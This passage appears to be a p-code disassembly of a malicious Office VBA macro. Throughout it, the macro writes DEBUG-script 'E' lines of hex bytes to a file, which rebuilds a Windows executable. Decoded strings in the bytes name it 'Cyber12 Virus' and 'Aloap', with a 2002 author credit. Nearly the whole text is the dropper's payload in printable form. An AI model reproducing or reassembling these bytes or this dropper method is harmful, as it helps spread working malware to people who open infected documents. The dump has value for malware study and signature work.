' 	PrintItemNL 
' Line #777:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09F0 66 0C 03 D8 8B 46 06 F7 E1 03 D3 5B 5D CA 08 00"
' 	PrintItemNL 
' Line #778:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A00 55 8B EC 33 C0 8B 4E 0E E3 79 1E 57 56 C5 76 06"
' 	PrintItemNL 
' Line #779:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A10 C4 7E 0A 8B C1 48 8B D7 F7 D2 2B C2 1B DB 23 C3"
' 	PrintItemNL 
' Line #780:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A20 03 C2 8B D6 F7 D2 2B C2 1B DB 23 C3 03 C2 40 91"
' 	PrintItemNL 
' Line #781:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A30 2B C1 92 AC 26 8A 25 3A E0 75 1F 47 E2 F5 92 91"
' 	PrintItemNL 
' Line #782:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A40 E3 3E 0B F6 75 07 8C D8 05 FF FF 8E D8 0B FF 75"
' 	PrintItemNL 
' Line #783:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A50 C2 8C C0 05 A9 07 8E C0 EB B9 2C 41 3C 1A 1A DB"
' 	PrintItemNL 
' Line #784:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A60 80 E3 20 02 C3 04 41 80 EC 41 80 FC 1A 1A DB 80"
' 	PrintItemNL 
' Line #785:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A70 E3 20 02 E3 80 C4 41 3A C4 74 C0 1B C0 83 D8 FF"
' 	PrintItemNL 
' Line #786:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A80 5E 5F 1F 5D CB 00 55 8B EC 5D C3 B8 14 00 E9 FA"
' 	PrintItemNL 
' Line #787:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A90 FC 00 45 55 8B EC 1E 83 EC 02 83 7E 06 00 75 05"
' 	PrintItemNL 
' Line #788:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AA0 C7 46 06 01 00 B8 FF FF 50 9A 9F 08 00 00 B8 20"
' 	PrintItemNL 
' Line #789:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AB0 00 50 FF 76 06 9A FF FF 00 00 89 46 FC B8 FF FF"
' 	PrintItemNL 
' Line #790:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AC0 50 9A C7 08 00 00 83 7E FC 00 75 17 A1 A0 00 0B"
' 	PrintItemNL 
' Line #791:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AD0 06 9E 00 74 0E FF 76 06 FF 1E 9E 00 83 C4 02 0B"
' 	PrintItemNL 
' Line #792:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AE0 C0 75 C2 8B 46 FC 8D 66 FE 1F 5D 4D CB 90 45 55"
' 	PrintItemNL 
' Line #793:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AF0 8B EC 1E 83 7E 06 00 74 08 FF 76 06 9A FF FF 00"
' 	PrintItemNL 
' Line #794:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B00 00 8D 66 FE 1F 5D 4D CB 45 55 8B EC 1E 83 EC 04"
' 	PrintItemNL 
' Line #795:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B10 83 7E 06 00 75 0E FF 76 08 9A F2 07 90 08 83 C4"
' 	PrintItemNL 
' Line #796:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B20 02 EB 4B 90 83 7E 08 00 75 10 FF 76 06 9A 4E 08"
' 	PrintItemNL 
' Line #797:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B30 12 07 83 C4 02 33 C0 EB 35 90 B8 FF FF 50 9A FF"
' 	PrintItemNL 
' Line #798:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B40 FF 00 00 FF 76 06 83 7E 08 00 74 06 8B 46 08 EB"
' 	PrintItemNL 
' Line #799:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B50 04 90 B8 01 00 50 B8 62 00 50 9A FF FF 00 00 89"
' 	PrintItemNL 
' Line #800:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B60 46 FC B8 FF FF 50 9A FF FF 00 00 8B 46 FC 8D 66"
' 	PrintItemNL 
' Line #801:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B70 FE 1F 5D 4D CB 90 45 55 8B EC 1E FF 76 06 9A FF"
' 	PrintItemNL 
' Line #802:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B80 FF 00 00 8D 66 FE 1F 5D 4D CB 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #803:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B90 C8 02 00 00 56 83 7E 0C 00 74 19 9A FF FF 00 00"
' 	PrintItemNL 
' Line #804:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BA0 50 1E 68 A8 00 1E 68 A2 00 6A 10 9A FF FF 00 00"
' 	PrintItemNL 
' Line #805:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BB0 33 C0 EB 30 8B 76 FE FF 76 06 FF 76 0A FF 76 08"
' 	PrintItemNL 
' Line #806:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BC0 FF 76 0C FF 76 0E 9A 4A 09 38 09 83 C4 0A 0B C0"
' 	PrintItemNL 
' Line #807:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BD0 74 10 FF 76 0E 9A E4 09 40 09 5B 8B F0 9A 14 0A"
' 	PrintItemNL 
' Line #808:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BE0 FF FF 8B C6 5E C9 CA 0A 00 00 C8 1A 00 00 56 8B"
' 	PrintItemNL 
' Line #809:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BF0 76 06 83 7E 08 00 75 4F C7 46 E6 00 00 C7 46 E8"
' 	PrintItemNL 
' Line #810:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C00 16 0A C7 46 EA 29 09 33 C0 89 46 EC 89 46 EE 89"
' 	PrintItemNL 
' Line #811:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C10 76 F0 56 1E 68 C2 00 9A FF FF 00 00 89 46 F2 C7"
' 	PrintItemNL 
' Line #812:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C20 46 F4 00 00 C7 46 F6 02 00 2B C0 89 46 FA 89 46"
' 	PrintItemNL 
' Line #813:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C30 F8 C7 46 FC CC 00 8C 5E FE 8D 46 E6 16 50 9A FF"
' 	PrintItemNL 
' Line #814:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C40 FF 00 00 0B C0 74 39 1E 68 CC 00 1E 68 DA 00 68"
' 	PrintItemNL 
' Line #815:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C50 08 20 6A 00 68 00 80 68 00 80 68 00 80 68 00 80"
' 	PrintItemNL 
' Line #816:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C60 6A 00 6A 00 56 6A 00 6A 00 9A FF FF 00 00 A3 92"
' 	PrintItemNL 
' Line #817:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C70 02 89 36 90 02 50 6A 07 9A FF FF 00 00 A1 92 02"
' 	PrintItemNL 
' Line #818:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C80 5E C9 CB 00 C8 12 00 00 EB 14 8D 46 EE 16 50 9A"
' 	PrintItemNL 
' Line #819:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C90 FF FF 00 00 8D 46 EE 16 50 9A FF FF 00 00 8D 46"
' 	PrintItemNL 
' Line #820:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CA0 EE 16 50 6A 00 6A 00 6A 00 9A FF FF 00 00 0B C0"
' 	PrintItemNL 
' Line #821:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CB0 75 D8 C9 CB CB 00 C8 14 00 00 57 56 8B 46 0C 48"
' 	PrintItemNL 
' Line #822:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CC0 74 2D 48 75 03 E9 AC 00 2D 11 00 75 03 E9 DE 00"
' 	PrintItemNL 
' Line #823:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CD0 2D 00 01 75 03 E9 BD 00 FF 76 0E FF 76 0C FF 76"
' 	PrintItemNL 
' Line #824:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CE0 0A FF 76 08 FF 76 06 9A FF FF 00 00 E9 C2 00 8B"
' 	PrintItemNL 
' Line #825:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CF0 76 0E 6A 00 9A 5F 0A 00 00 A3 7A 02 6A 01 9A FF"
' 	PrintItemNL 
' Line #826:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D00 FF 00 00 A3 7C 02 56 68 4C 04 1E 68 A2 00 1E 68"
' 	PrintItemNL 
' Line #827:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D10 E8 00 6A 1E 9A FF FF 00 00 8B F8 50 6A 00 6A 00"
' 	PrintItemNL 
' Line #828:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D20 9A FF FF 00 00 57 1E 68 EE 00 8D 46 EC 16 50 9A"
' 	PrintItemNL 
' Line #829:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D30 FF FF 00 00 83 C4 0A 1E 68 A2 00 1E 68 E8 00 8D"
' 	PrintItemNL 
' Line #830:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D40 46 EC 16 50 9A B6 0A 00 00 1E 68 A2 00 1E 68 0A"
' 	PrintItemNL 
' Line #831:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D50 01 1E 68 F2 00 9A FF FF 00 00 68 65 09 68 18 0B"
' 	PrintItemNL 
' Line #832:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D60 FF 36 90 02 9A FF FF 00 00 A3 7E 02 89 16 80 02"
' 	PrintItemNL 
' Line #833:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D70 56 E9 67 FF FF 36 80 02 FF 36 7E 02 9A FF FF 00"
' 	PrintItemNL 
' Line #834:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D80 00 FF 76 0E 68 4C 04 9A FF FF 00 00 6A 00 9A FF"
' 	PrintItemNL 
' Line #835:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D90 FF 00 00 EB 19 8B 46 0A 2D 4C 04 75 11 FF 36 80"
' 	PrintItemNL 
' Line #836:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DA0 02 FF 36 7E 02 6A 00 6A 00 9A FF FF 00 00 33 C0"
' 	PrintItemNL 
' Line #837:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DB0 99 5E 5F C9 CA 0A 00 00 C8 26 00 00 57 56 8B 76"
' 	PrintItemNL 
' Line #838:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DC0 0A 56 8D 46 DA 16 50 6A 13 9A FF FF 00 00 6A 06"
' 	PrintItemNL 
' Line #839:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DD0 1E 68 12 01 8D 46 DA 16 50 9A 60 07 A8 0B 83 C4"
' 	PrintItemNL 
' Line #840:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DE0 0A 0B C0 74 1E 56 9A FF FF 00 00 0B C0 75 14 56"
' 	PrintItemNL 
' Line #841:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DF0 9A FF FF 00 00 0B C0 74 0A 56 9A FF FF 00 00 0B"
' 	PrintItemNL 
' Line #842:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E00 C0 75 03 E9 CA 00 56 8D 46 EE 16 50 9A FF FF 00"
' 	PrintItemNL 
' Line #843:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E10 00 8B 46 F2 8B 7E EE 2B C7 89 46 FC 8B 46 F0 89"
' 	PrintItemNL 
' Line #844:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E20 46 FE 2B 46 F4 F7 D8 89 46 FA 0B FF 7F 07 C7 46"
' 	PrintItemNL 
' Line #845:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E30 F6 01 00 EB 29 8B 46 FC 03 C7 3B 06 7A 02 7C 05"
' 	PrintItemNL 
' Line #846:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E40 B8 FF FF EB 16 9A FA 06 DF 0B 2D FF 3F 0B C0 7E"
' 	PrintItemNL 
' Line #847:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E50 05 B8 01 00 EB 02 33 C0 03 C0 48 89 46 F6 83 7E"
' 	PrintItemNL 
' Line #848:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E60 FE 00 7F 07 C7 46 F8 01 00 EB 2A 8B 46 FA 03 46"
' 	PrintItemNL 
' Line #849:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E70 FE 3B 06 7C 02 7C 05 B8 FF FF EB 16 9A FA 06 F8"
' 	PrintItemNL 
' Line #850:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E80 0B 2D FF 3F 0B C0 7E 05 B8 01 00 EB 02 33 C0 03"
' 	PrintItemNL 
' Line #851:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E90 C0 48 89 46 F8 9A FA 06 0F 0C 8B C8 81 C1 E8 03"
' 	PrintItemNL 
' Line #852:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EA0 69 46 F6 30 75 99 F7 F9 03 F8 56 57 9A FA 06 BB"
' 	PrintItemNL 
' Line #853:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EB0 0A 8B C8 81 C1 E8 03 69 46 F8 30 75 99 F7 F9 03"
' 	PrintItemNL 
' Line #854:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EC0 46 FE 50 FF 76 FC FF 76 FA 6A 01 9A FF FF 00 00"
' 	PrintItemNL 
' Line #855:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0ED0 B8 FF FF 5E 5F C9 CA 06 00 2E 00 03 01 F0 09 02"
' 	PrintItemNL 
' Line #856:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EE0 00 71 00 03 01 FA 09 02 00 72 00 02 00 7C 08 01"
' 	PrintItemNL 
' Line #857:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EF0 00 00 00 03 01 29 05 01 00 01 00 03 01 49 00 01"
' 	PrintItemNL 
' Line #858:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F00 00 03 00 03 01 62 04 01 00 83 00 03 01 16 08 01"
' 	PrintItemNL 
' Line #859:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F10 00 05 00 03 01 BB 08 01 00 06 00 03 01 5D 08 01"
' 	PrintItemNL 
' Line #860:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F20 00 07 00 03 01 0C 09 02 00 01 00 03 01 20 05 01"
' 	PrintItemNL 
' Line #861:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F30 00 89 00 05 01 B4 07 01 00 72 00 03 01 DF 08 01"
' 	PrintItemNL 
' Line #862:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F40 00 0A 00 03 01 89 00 02 00 05 00 03 01 EF 0A 02"
' 	PrintItemNL 
' Line #863:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F50 00 06 00 03 01 8F 06 01 00 10 00 03 01 81 0A 02"
' 	PrintItemNL 
' Line #864:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F60 00 0A 00 03 01 E8 0A 02 00 0C 00 03 01 9D 06 01"
' 	PrintItemNL 
' Line #865:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F70 00 14 00 03 01 0A 08 01 00 17 00 03 01 22 08 01"
' 	PrintItemNL 
' Line #866:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F80 00 18 00 03 01 80 00 01 00 1E 00 03 01 FC 08 02"
' 	PrintItemNL 
' Line #867:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F90 00 17 00 03 01 47 0B 02 00 1F 00 03 01 6D 0B 02"
' 	PrintItemNL 
' Line #868:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FA0 00 20 00 03 01 5B 0B 02 00 23 00 03 01 90 0A 02"
' 	PrintItemNL 
' Line #869:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FB0 00 A4 01 03 01 CA 09 02 00 29 00 03 01 F9 02 01"
' 	PrintItemNL 
' Line #870:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FC0 00 31 00 03 01 D9 09 02 00 2A 00 03 01 C5 0A 01"
' 	PrintItemNL 
' Line #871:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FD0 00 33 00 03 01 DD 0A 01 00 34 00 03 01 78 09 02"
' 	PrintItemNL 
' Line #872:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FE0 00 AE 00 03 01 75 0A 01 00 39 00 03 01 51 0B 02"
' 	PrintItemNL 
' Line #873:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0FF0 00 31 00 03 01 A5 0A 01 00 3B 00 03 01 55 0A 02"
' 	PrintItemNL 
' Line #874:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1000 00 B3 00 03 01 0A 0B 02 00 36 00 03 01 2C 0C 02"
' 	PrintItemNL 
' Line #875:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1010 00 38 00 03 01 9F 09 02 00 39 00 03 01 2A 0B 02"
' 	PrintItemNL 
' Line #876:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1020 00 3A 00 05 01 10 00 01 00 B2 00 03 01 1E 00 01"
' 	PrintItemNL 
' Line #877:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1030 00 5B 00 03 01 8C 02 01 00 66 00 03 01 48 0A 02"
' 	PrintItemNL 
' Line #878:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1040 00 6B 00 03 01 0A 0A 02 00 6C 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #879:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #880:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1060 00 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #881:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1070 00 00 00 00 00 00 00 00 00 00 00 00 01 00 FF FF"
' 	PrintItemNL 
' Line #882:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1080 00 00 00 00 5F 43 5F 46 49 4C 45 5F 49 4E 46 4F"
' 	PrintItemNL 
' Line #883:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1090 3D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #884:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 01"
' 	PrintItemNL 
' Line #885:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10B0 00 00 14 00 14 00 28 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #886:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10C0 00 00 00 00 00 00 00 00 00 00 00 00 C1 00 00 00"
' 	PrintItemNL 
' Line #887:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #888:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10E0 00 00 00 00 00 00 8A 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #889:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 10F0 00 00 00 00 00 00 00 10 01 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #890:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1100 00 00 41 6C 6F 61 70 00 41 6C 6F 61 70 20 41 70"
' 	PrintItemNL 
' Line #891:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1110 70 20 41 6C 72 65 61 64 79 20 52 75 6E 6E 69 6E"
' 	PrintItemNL 
' Line #892:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1120 67 00 61 6C 6F 61 70 69 63 6F 00 00 41 4C 4F 41"
' 	PrintItemNL 
' Line #893:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1130 50 57 6E 64 43 6C 61 73 73 00 43 79 62 65 72 31"
' 	PrintItemNL 
' Line #894:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1140 32 20 56 69 72 75 73 00 54 69 6D 65 72 00 25 64"
' 	PrintItemNL 
' Line #895:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1150 00 00 20 41 67 75 73 74 69 6E 75 73 20 66 61 78"
' 	PrintItemNL 
' Line #896:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1160 7A 75 20 2D 20 32 30 30 32 00 50 72 6F 6A 65 63"
' 	PrintItemNL 
' Line #897:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1170 74 00 23 33 32 37 37 32 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #898:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1180 00 00 00 00 00 00 00 00 3C 3C 4E 4D 53 47 3E 3E"
' 	PrintItemNL 
' Line #899:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1190 00 00 52 36 30 30 30 0D 0A 2D 20 73 74 61 63 6B"
' 	PrintItemNL 
' Line #900:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11A0 20 6F 76 65 72 66 6C 6F 77 0D 0A 00 03 00 52 36"
' 	PrintItemNL 
' Line #901:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11B0 30 30 33 0D 0A 2D 20 69 6E 74 65 67 65 72 20 64"
' 	PrintItemNL 
' Line #902:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11C0 69 76 69 64 65 20 62 79 20 30 0D 0A 00 09 00 52"
' 	PrintItemNL 
' Line #903:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11D0 36 30 30 39 0D 0A 2D 20 6E 6F 74 20 65 6E 6F 75"
' 	PrintItemNL 
' Line #904:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11E0 67 68 20 73 70 61 63 65 20 66 6F 72 20 65 6E 76"
' 	PrintItemNL 
' Line #905:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 11F0 69 72 6F 6E 6D 65 6E 74 0D 0A 00 12 00 52 36 30"
' 	PrintItemNL 
' Line #906:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1200 31 38 0D 0A 2D 20 75 6E 65 78 70 65 63 74 65 64"
' 	PrintItemNL 
' Line #907:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1210 20 68 65 61 70 20 65 72 72 6F 72 0D 0A 00 14 00"
' 	PrintItemNL 
' Line #908:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1220 52 36 30 32 30 0D 0A 2D 20 75 6E 65 78 70 65 63"
' 	PrintItemNL 
' Line #909:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1230 74 65 64 20 51 75 69 63 6B 57 69 6E 20 65 72 72"
' 	PrintItemNL 
' Line #910:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1240 6F 72 0D 0A 00 08 00 52 36 30 30 38 0D 0A 2D 20"
' 	PrintItemNL 
' Line #911:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1250 6E 6F 74 20 65 6E 6F 75 67 68 20 73 70 61 63 65"
' 	PrintItemNL 
' Line #912:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1260 20 66 6F 72 20 61 72 67 75 6D 65 6E 74 73 0D 0A"
' 	PrintItemNL 
' Line #913:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1270 00 15 00 52 36 30 32 31 0D 0A 2D 20 6E 6F 20 6D"
' 	PrintItemNL 
' Line #914:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1280 61 69 6E 20 70 72 6F 63 65 64 75 72 65 0D 0A 00"
' 	PrintItemNL 
' Line #915:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1290 FC 00 0D 0A 00 FF 00 72 75 6E 2D 74 69 6D 65 20"
' 	PrintItemNL 
' Line #916:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12A0 65 72 72 6F 72 20 00 02 00 52 36 30 30 32 0D 0A"
' 	PrintItemNL 
' Line #917:
' 	Ld hFile 
